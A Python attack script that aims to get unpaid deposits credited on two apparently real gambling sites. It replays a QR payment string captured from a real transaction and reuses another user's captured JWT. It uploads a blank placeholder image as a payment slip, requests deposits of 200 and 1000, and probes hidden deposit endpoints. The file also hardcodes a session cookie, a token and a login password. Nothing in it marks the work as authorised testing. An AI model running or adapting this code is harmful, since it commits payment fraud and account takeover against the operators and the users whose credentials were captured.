#!/usr/bin/env python3
"""probe_gsc.py — Replay captured QR string on vak88z2 + upload-slip step + we88c JWT probe.

   FINDING from traffic capture:
   - we88c deposit auto-credited with qr_string present
   - Missing step: POST /mb/upload-slip after sign-url-upload-slip
   - we88c JWT: sub=266d74e3 exp=1791531665 (possibly still valid)
"""
import base64, json, pathlib, requests, time

TID_VAK  = "af6efb584a3d317b5a11ab6209b88e1b"
TID_WE88 = "54ef7626cb381f4bab8be91f0cdbce47"
MGAPI_VAK  = f"https://{TID_VAK}mgapi.asdgapicenterssdo.com"
MGAPI_WE88 = f"https://{TID_WE88}mgapi.asdgapicenterssdo.com"
DOMAIN_VAK  = "m.vak88z2.com"
DOMAIN_WE88 = "m.we88c.com"

# vak88z2 player creds
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"
BANK_INFO_VAK = "18a9502b-94ae-4188-8841-094be8b3b974"
DEP_ACCT_VAK  = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"

# we88c creds (captured)
JWT_WE88 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyNjZkNzRlMy1kNmNhLTQ3ZWItYjlhYy1iOGM0NTU3NGJhZDQiLCJjZiI6IjEwNjBlZGM0OTg3ZWU3ODJhMDQ5YTdjYWJhZTEwNjg3IiwiaXNfbm90X2NvbXBsZXRlIjpmYWxzZSwiZXhwIjoxNzkxNTMxNjY1LCJpYXQiOjE3OTE1MTcyNjV9.XIeAiJyq3_VF_k3WcSspqFqxpWHW7OzH-E4o1TMLX-Y"
BANK_INFO_WE88 = "2c595a21-9bba-4d06-ab30-5dc3c97dacb9"
DEP_ACCT_WE88  = "a62dea72-6439-11f1-a811-0644d6fb2ecf"
SLIP_FILENAME  = "7658b94f-de87-46d1-a58b-f0e4c08776a8.png"

# QR string from captured successful deposit
QR_STRING = "0041000600000101030040220016282111918DTF096805102TH91047683"

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def get_jwt():
    cached = JWT_FILE.read_text().strip() if JWT_FILE.exists() else ""
    if cached:
        p = json.loads(base64.urlsafe_b64decode(cached.split(".")[1] + "=="))
        if p.get("exp", 0) - time.time() > 300:
            return cached
    r = requests.post(
        f"https://{TID_VAK}pbapi.asdgapicenterssdo.com/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy":"local","username":"0972571110","password":"Pwned2026!"},
        timeout=15)
    if r.status_code in (200,201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    raise RuntimeError(f"Auth failed: {r.status_code}")

JWT_VAK = get_jwt()
HDR_VAK  = {"Authorization": f"Bearer {JWT_VAK}", "template": "vn",
             "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}
HDR_WE88 = {"Authorization": f"Bearer {JWT_WE88}", "template": "vn",
             "Content-Type": "application/json"}

def wallet(mgapi, hdr):
    r = requests.get(f"{mgapi}/mb/wallet", headers=hdr, timeout=10)
    if r.ok:
        d = r.json()
        items = d.get("data", [])
        bal = items[0].get("balance", "?") if items else d.get("balance", "?")
        return bal
    return f"ERR:{r.status_code}"

print(f"vak88z2 wallet before: {wallet(MGAPI_VAK, HDR_VAK)}")
print(f"we88c JWT exp_in: {1791531665 - int(time.time())}s")

# ── 1. Check we88c JWT still valid ───────────────────────────────────────────
print("\n=== 1. we88c JWT probe ===")
r = requests.get(f"{MGAPI_WE88}/mb/wallet?include=true", headers=HDR_WE88, timeout=10)
print(f"  GET we88c wallet: HTTP {r.status_code}: {r.text[:300]}")

if r.ok:
    bal = r.json().get("balance", r.json().get("data",[{}])[0].get("balance","?"))
    print(f"  we88c balance: {bal}")

# ── 2. Full deposit flow with upload-slip on we88c ───────────────────────────
print("\n=== 2. Full deposit flow on we88c (sign → upload → auto-slip-deposit) ===")
if r.ok:
    # Step 1: sign URL
    sr = requests.post(f"{MGAPI_WE88}/mb/sign-url-upload-slip", headers=HDR_WE88,
                       json={"filename":"IMG_0802.jpeg","content_type":"image/png","size":680284},
                       timeout=15)
    print(f"  sign-url: {sr.status_code}: {sr.text[:200]}")
    new_fn = sr.json().get("filename","") if sr.ok else SLIP_FILENAME
    upload_url = sr.json().get("urlUpload","") if sr.ok else ""

    # Upload minimal PNG to the signed URL
    if upload_url:
        minimal_png = (
            b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
            b'\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00'
            b'\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82'
        )
        pur = requests.put(upload_url, headers={"Content-Type":"image/png"},
                           data=minimal_png, timeout=20)
        print(f"  upload PUT: {pur.status_code}")

    # Step 2: upload-slip (the MISSING step)
    usl = requests.post(f"{MGAPI_WE88}/mb/upload-slip", headers=HDR_WE88,
                        json={"filename": new_fn or SLIP_FILENAME,
                              "fileOriginalName": "IMG_0802.jpeg",
                              "contentType": "image/jpeg",
                              "size": 680284},
                        timeout=15)
    print(f"  upload-slip: {usl.status_code}: {usl.text[:200]}")

    # Step 3: auto-slip-deposit WITH QR string
    dep = requests.post(f"{MGAPI_WE88}/mb/auto-slip-deposit", headers=HDR_WE88,
                        json={"payment_bank_information_id": BANK_INFO_WE88,
                              "deposit_amount": 200,
                              "note": "$",
                              "deposit_account_id": DEP_ACCT_WE88,
                              "slip_image_url": new_fn or SLIP_FILENAME,
                              "qr_string": QR_STRING},
                        timeout=15)
    print(f"  auto-slip-deposit: {dep.status_code}: {dep.text[:300]}")

    time.sleep(5)
    print(f"  we88c wallet after: {wallet(MGAPI_WE88, HDR_WE88)}")

# ── 3. Same flow on vak88z2 with QR string ────────────────────────────────────
print("\n=== 3. vak88z2 deposit WITH qr_string (the missing piece) ===")
# Step 1: sign URL
sr2 = requests.post(f"{MGAPI_VAK}/mb/sign-url-upload-slip", headers=HDR_VAK,
                    json={"filename":"slip.png","content_type":"image/png","size":1024},
                    timeout=15)
new_fn2 = sr2.json().get("filename","slip.png") if sr2.ok else "slip.png"
upload_url2 = sr2.json().get("urlUpload","") if sr2.ok else ""
print(f"  sign-url: {sr2.status_code}, filename={new_fn2[:20]}")

# Upload
if upload_url2:
    minimal_png = (
        b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
        b'\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00'
        b'\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82'
    )
    pur2 = requests.put(upload_url2, headers={"Content-Type":"image/png"},
                        data=minimal_png, timeout=20)
    print(f"  upload PUT: {pur2.status_code}")

# upload-slip step (MISSING from our previous attempts)
usl2 = requests.post(f"{MGAPI_VAK}/mb/upload-slip", headers=HDR_VAK,
                     json={"filename": new_fn2,
                           "fileOriginalName": "slip.png",
                           "contentType": "image/png",
                           "size": 1024},
                     timeout=15)
print(f"  upload-slip: {usl2.status_code}: {usl2.text[:200]}")

# auto-slip-deposit WITH QR string
dep2 = requests.post(f"{MGAPI_VAK}/mb/auto-slip-deposit", headers=HDR_VAK,
                     json={"payment_bank_information_id": BANK_INFO_VAK,
                           "deposit_amount": 1000,
                           "note": "",
                           "deposit_account_id": DEP_ACCT_VAK,
                           "slip_image_url": new_fn2,
                           "qr_string": QR_STRING},
                     timeout=15)
print(f"  auto-slip-deposit+QR: {dep2.status_code}: {dep2.text[:300]}")

time.sleep(8)
print(f"  vak88z2 wallet after: {wallet(MGAPI_VAK, HDR_VAK)}")

# ── 4. Try QR-only deposit (no slip) ────────────────────────────────────────
print("\n=== 4. QR-only deposit endpoints ===")
for path, payload in [
    ("/mb/qr-deposit", {"qr_string": QR_STRING, "amount": 1000}),
    ("/mb/promptpay-deposit", {"qr_string": QR_STRING, "amount": 1000,
                               "deposit_account_id": DEP_ACCT_VAK}),
    ("/mb/auto-deposit", {"payment_bank_information_id": BANK_INFO_VAK,
                          "deposit_amount": 1000, "deposit_account_id": DEP_ACCT_VAK,
                          "qr_string": QR_STRING}),
]:
    r = requests.post(f"{MGAPI_VAK}{path}", headers=HDR_VAK, json=payload, timeout=10)
    if r.status_code not in (404,):
        print(f"  [!!!] POST {path}: {r.status_code}: {r.text[:200]}")
    else:
        print(f"  POST {path}: 404")

time.sleep(3)
print(f"\nFINAL vak88z2 wallet: {wallet(MGAPI_VAK, HDR_VAK)}")
print("=== DONE ===")
